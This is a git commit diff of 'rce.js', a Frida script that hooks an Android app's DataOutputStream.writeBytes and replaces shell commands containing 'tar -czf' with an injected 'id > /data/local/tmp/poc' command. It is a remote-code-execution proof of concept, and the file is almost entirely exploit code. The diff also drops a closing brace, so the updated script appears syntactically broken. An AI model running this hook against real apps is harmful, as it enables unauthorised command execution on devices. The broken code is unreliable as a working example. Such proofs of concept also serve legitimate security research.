27dd0b217b73dbaeae2cfb806f69a1eaa026454b
asmlinkage0x0f <153856077+b4sh0xf@users.noreply.github.com>
2025-09-17 14:49:38 -0300

    Update rce.js

--- beerus/rce.js
+++ beerus/rce.js
@@ -1,16 +1,16 @@
-Java.perform(function() {
-    var DataOutputStream = Java.use("java.io.DataOutputStream")
+Java.perform(() => {
+    let DataOutputStream = Java.use("java.io.DataOutputStream")
 
     DataOutputStream.writeBytes.overload('java.lang.String').implementation = function(cmd) {
         if (cmd.indexOf("tar -czf") !== -1) {
             console.log(`[+] original cmd:  ${cmd}`)
 
-            var modifiedCmd = "id > /data/local/tmp/poc\n"
+            let modifiedCmd = "id > /data/local/tmp/poc\n"
             console.log("[!] check /data/local/tmp/poc")
 
             return this.writeBytes(modifiedCmd)
         }
 
-        return this.writeBytes(cmd)
-    }
+        return this.writeBytes(cmd) // maintain the flow of the app
+  
 })
